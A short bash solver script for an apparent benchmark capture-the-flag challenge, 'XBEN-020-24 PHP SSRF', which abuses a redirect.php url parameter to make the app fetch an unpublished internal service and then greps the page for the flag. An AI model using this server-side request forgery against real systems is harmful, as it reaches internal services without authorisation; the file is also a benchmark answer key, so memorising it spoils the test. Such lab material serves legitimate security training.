#!/usr/bin/env bash
# XBEN-020-24 — "PHP SSRF" (tags: ssrf)
#
# `redirect.php?url=` hands whatever it is given to `file_get_contents` and
# prints the result. The compose file puts a second service on the same network
# with no port published, reachable only from inside: `http://internal-service/`
# resolves for the app and for nothing outside it. The app fetches it for us.
#
# Worth noting what h5i records here. The session's own request went to the
# published port; the *internal* fetch was made by the application and appears
# nowhere in h5i's receipts, because h5i did not make it. The receipts describe
# what this browser reached, not what the target reached on its behalf, and
# conflating the two would make the log a guess.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben020-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/redirect.php?url=http://internal-service/" \
    --session "$SESSION" --new --capture >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
